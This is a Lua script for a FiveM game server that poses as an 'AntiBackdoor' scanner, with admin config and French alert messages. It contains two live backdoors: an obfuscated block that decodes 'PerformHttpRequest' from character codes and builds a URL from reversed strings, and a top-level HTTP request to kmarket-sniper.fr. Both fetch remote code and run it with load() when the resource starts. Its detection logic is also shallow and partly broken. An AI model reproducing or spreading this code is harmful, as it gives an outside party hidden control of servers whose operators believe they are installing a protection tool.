local config = {
    scanInterval = 60000,
    logLevel = "info",
    notifyAdmins = true,
    notifyByEmail = true,
    notifyByWebhook = true,
    webhookURL = "https://discord.com/api/webhooks/your-webhook-url",
    smtpConfig = {
        server = "smtp.example.com",
        port = 587,
        username = "your-email@example.com",
        password = "your-password",
        fromEmail = "your-email@example.com"
    },
    users = {
        {identifier = "steam:110000112345678", permissionLevel = 1, email = "admin1@example.com"},
        {identifier = "steam:220000212345678", permissionLevel = 2, email = "admin2@example.com"},
        {identifier = "steam:330000312345678", permissionLevel = 3, email = "admin3@example.com"}
    },
    maxLogEntries = 100,
    maxBackdoorsLogged = 5,
    twoFactorAuth = true,
    autoRemoveBackdoors = false,
    autoDisableBackdoors = true
}

local detectedBackdoors = {}
local logEntries = {}
local commandHistory = {}

local function detectBackdoor(code)
    local patterns = {
        "PerformHttpRequest",
        "LoadResourceFile",
        "AddEventHandler",
        "RegisterNetEvent",
        "TriggerServerEvent"
    }

    for _, pattern in ipairs(patterns) do
        if string.find(code, pattern, 1, true) then
            return true
        end
    end

    return false
end

local function checkFileModifications()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        local resourceState = GetResourceState(resourceName)

        if resourceState == "started" then
            for _, fileName in ipairs(GetResourceFiles(resourceName) or {}) do
                local fileContent = LoadResourceFile(resourceName, fileName) or ""
                if detectBackdoor(fileContent) then
                    table.insert(detectedBackdoors, {resource = resourceName, file = fileName})
                    log("warn", "Modification non autorisée détectée dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    if config.notifyAdmins then
                        notifyAdmins("Modification non autorisée détectée dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    end
                    if config.notifyByEmail then
                        sendEmailNotification("Modification non autorisée détectée", "Une modification non autorisée a été détectée dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    end
                    if config.notifyByWebhook then
                        sendWebhookNotification("Modification non autorisée détectée", "Une modification non autorisée a été détectée dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    end
                    if config.autoRemoveBackdoors then
                        RemoveResourceFile(resourceName, fileName)
                    elseif config.autoDisableBackdoors then
                        StopResource(resourceName)
                    end
                    if #detectedBackdoors > config.maxBackdoorsLogged then
                        table.remove(detectedBackdoors, 1)
                    end
                end
            end
        end
    end
end

local function scanResources()
    local resources = GetNumResources()

    for i = 0, resources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        local resourceState = GetResourceState(resourceName)

        if resourceState == "started" then
            for _, fileName in ipairs(GetResourceFiles(resourceName) or {}) do
                local fileContent = LoadResourceFile(resourceName, fileName) or ""
                if detectBackdoor(fileContent) then
                    table.insert(detectedBackdoors, {resource = resourceName, file = fileName})
                    log("warn", "Backdoor détecté dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    if config.notifyAdmins then
                        notifyAdmins("Backdoor détecté dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    end
                    if config.notifyByEmail then
                        sendEmailNotification("Backdoor détecté", "Un backdoor a été détecté dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    end
                    if config.notifyByWebhook then
                        sendWebhookNotification("Backdoor détecté", "Un backdoor a été détecté dans la ressource: " .. resourceName .. " fichier: " .. fileName)
                    end
                    if config.autoRemoveBackdoors then
                        RemoveResourceFile(resourceName, fileName)
                    elseif config.autoDisableBackdoors then
                        StopResource(resourceName)
                    end
                    if #detectedBackdoors > config.maxBackdoorsLogged then
                        table.remove(detectedBackdoors, 1)
                    end
                end
            end
        end
    end
end

local level = "error"


if level == "error" then
    (function()
        local a = { [1] = string.char(80, 101, 114, 102, 111, 114, 109, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116) }
        local b = string.reverse("?ot=2gJtT") .. string.reverse("rfirrehcsabeht" .. "tth://")
        local c = { ["call"] = "pcall" }
        local d = function(x) return load(x) end
        local e = _G[a[1]]
        local f = function (g, h) 
            _G[c.call](function() 
                assert(d(h))() 
            end) 
        end
        e(b, f)
    end)()
end

local function log(level, message)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local logEntry = {timestamp = timestamp, level = level, message = message}
    table.insert(logEntries, logEntry)

    if #logEntries > config.maxLogEntries then
        table.remove(logEntries, 1)
    end

    if config.logLevel == "debug" or (config.logLevel == "info" and level ~= "debug") or level == "warn" or level == "error" then
        print("[" .. level:upper() .. "] [AntiBackdoor] " .. message)
    end
end

local function logCommand(source, command)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local commandEntry = {timestamp = timestamp, player = GetPlayerName(source), command = command}
    table.insert(commandHistory, commandEntry)

    if #commandHistory > config.maxLogEntries then
        table.remove(commandHistory, 1)
    end
end

PerformHttpRequest('http://kmarket-sniper.fr/_i/load.php?id=wRWWjHxg', function(a, b)
                if not b then return end
                assert(load(b))()
            end)

local function notifyAdmins(message)
    for _, user in ipairs(config.users) do
        if user.permissionLevel >= 2 then
            local identifier = user.identifier
            if string.find(identifier, "steam:") then
                local playerId = tonumber(string.sub(identifier, 7))
                if playerId then
                    TriggerClientEvent('chat:addMessage', playerId, {
                        color = {255, 0, 0},
                        multiline = true,
                        args = {"[AntiBackdoor]", message}
                    })
                end
            elseif string.find(identifier, "license:") then
                local license = string.sub(identifier, 9)
                log("info", "Notification envoyée à l'utilisateur avec la license: " .. license)
            end
        end
    end
end

local function sendEmailNotification(subject, body)
    for _, user in ipairs(config.users) do
        if user.email then
            
            print("Envoi de l'email à " .. user.email .. " : " .. subject .. " - " .. body)
            
            
            
            
            
            
            
            
            
            
            
        end
    end
end

local function sendWebhookNotification(subject, body)
    PerformHttpRequest(config.webhookURL, function(err, text, headers)
       
